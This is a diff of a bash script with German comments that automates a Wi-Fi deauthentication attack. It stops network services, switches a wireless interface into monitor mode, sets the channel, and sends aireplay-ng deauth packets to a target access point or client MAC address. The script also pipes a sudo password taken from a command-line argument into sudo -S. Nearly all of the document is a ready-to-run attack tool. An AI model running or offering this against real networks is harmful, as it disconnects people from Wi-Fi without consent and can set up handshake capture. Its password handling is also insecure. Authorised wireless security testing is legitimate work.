@@ -1,59 +1,57 @@
 #!/bin/bash
 
-INTERFACE="$1"
-TARGET_MAC="$2"
-PACKETS="$3"
-DESIRED_CHANNEL="$4"
-SECRET="$5"
 
-if [ -z "$INTERFACE" ] || [ -z "$TARGET_MAC" ]; then
-  echo "❌ Interface oder MAC-Adresse fehlen"
+# -----------------------------------------------------------------------------
+# 0) Parameter prüfen
+# -----------------------------------------------------------------------------
+INTERFACE="$1"              # z.B. wlan0
+TARGET_MAC="$2"             # BSSID oder Client-MAC, z.B. AA:BB:CC:DD:EE:FF
+PACKETS="$3"                
+CHANNEL="$4"         
+SECRET="$5"                 # sudo-Passwort
+
+if [[ -z "$INTERFACE" || -z "$TARGET_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
+  echo "Usage: $0 <interface> <target_mac> <channel> [packets] <sudo-secret>"
   exit 1
 fi
 
-# Default-Werte
-PACKETS=${PACKETS:-100}
-DESIRED_CHANNEL=${DESIRED_CHANNEL:-6}
+# -----------------------------------------------------------------------------
+# 1) Interferierende Prozesse beenden
+# -----------------------------------------------------------------------------
+# Beende eventuelle laufende Tools
+echo "$SECRET" | sudo -S killall airodump-ng aircrack-ng >/dev/null 2>&1 || true
+# Deaktiviere NetworkManager, wpa_supplicant, dhcpcd etc.
+echo "$SECRET" | sudo -S airmon-ng check kill >/dev/null 2>&1 || true
 
-# kill airodump
-echo $SECRET | sudo -S killall airodump-ng
-echo $SECRET | sudo -S killall aircrack-ng
-echo $SECRET | sudo -S killall airmon-ng
-
-echo $SECRET | sudo -S airmon-ng check kill
-echo $SECRET | sudo -S airmon-ng stop "$INTERFACE"
-
-# Prüfe ob das Interface im Monitor-Modus ist
-MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
-if [ "$MODE" != "Monitor" ]; then
-  echo "[i] Setze $INTERFACE in den Monitor-Modus..."
-  echo $SECRET | sudo -S ip link set "$INTERFACE" down
-  echo $SECRET | sudo -S iw dev "$INTERFACE" set type monitor
-  echo $SECRET | sudo -S ip link set "$INTERFACE" up
-  echo $SECRET | sudo -S iw dev "$INTERFACE" set power_save off
+# -----------------------------------------------------------------------------
+# 2) Interface in Monitor-Mode versetzen
+# -----------------------------------------------------------------------------
+echo "[i] Setze Interface '$INTERFACE' in den Monitor-Modus"
+echo "$SECRET" | sudo -S ip link set "$INTERFACE" down
+# Versuch moderner iw-CLI, fallback auf iwconfig
+if ! echo "$SECRET" | sudo -S iw dev "$INTERFACE" set type monitor; then
+  echo "$SECRET" | sudo -S iwconfig "$INTERFACE" mode Monitor
 fi
 
-# 1) Aktuellen Kanal ermitteln
-CURRENT_CHANNEL=$(iw dev "$INTERFACE" info 2>/dev/null \
-  | awk '/channel/ {print $2; exit}')
+echo "$SECRET" | sudo -S ip link set "$INTERFACE" up
+# Deaktiviere Energiesparen
+echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off >/dev/null 2>&1 || true
 
-if [ -z "$CURRENT_CHANNEL" ]; then
-  echo "⚠️  Konnte aktuellen Kanal nicht ermitteln. Nutze gewünschten Kanal $DESIRED_CHANNEL"
-  CURRENT_CHANNEL="$DESIRED_CHANNEL"
-fi
+# -----------------------------------------------------------------------------
+# 3) Kanal setzen
+# -----------------------------------------------------------------------------
+echo "[i] Setze Interface '$INTERFACE' auf Kanal $CHANNEL"
+# Primär iwconfig, fallback iw
+echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL" || (echo "$SECRET" | sudo -S iw dev "$INTERFACE" set channel "$CHANNEL")
+# Warte kurz, damit der Treiber den Kanal wechseln kann
+sleep 1
 
-echo "🔍 Aktueller Kanal: $CURRENT_CHANNEL"
-echo "🎯 Gewünschter Kanal: $DESIRED_CHANNEL"
+# -----------------------------------------------------------------------------
+# 4) Deauth-Pakete senden
+# -----------------------------------------------------------------------------
+echo "[i] Sende $PACKETS Deauth-Pakete an $TARGET_MAC über Interface '$INTERFACE' (Kanal '$CHANNEL')"
+echo "$SECRET" | sudo -S aireplay-ng --deauth "$PACKETS" -a "$TARGET_MAC" "$INTERFACE"
 
-# 2) Kanal ggf. anpassen
-if [ "$CURRENT_CHANNEL" -ne "$DESIRED_CHANNEL" ]; then
-  echo "🔁 Setze Kanal $DESIRED_CHANNEL für Interface $INTERFACE"
-  echo $SECRET | sudo -S iwconfig "$INTERFACE" channel "$DESIRED_CHANNEL"
-  sleep 1
-else
-  echo "✅ Kanal stimmt bereits. Kein Wechsel nötig."
-fi
+# Script Ende
+exit 0
 
-# 3) Deauth-Pakete senden
-echo "🚀 Sende $PACKETS Deauth-Pakete an $TARGET_MAC über $INTERFACE (Kanal $DESIRED_CHANNEL)"
-sudo aireplay-ng --deauth "$PACKETS" -a "$TARGET_MAC" "$INTERFACE"
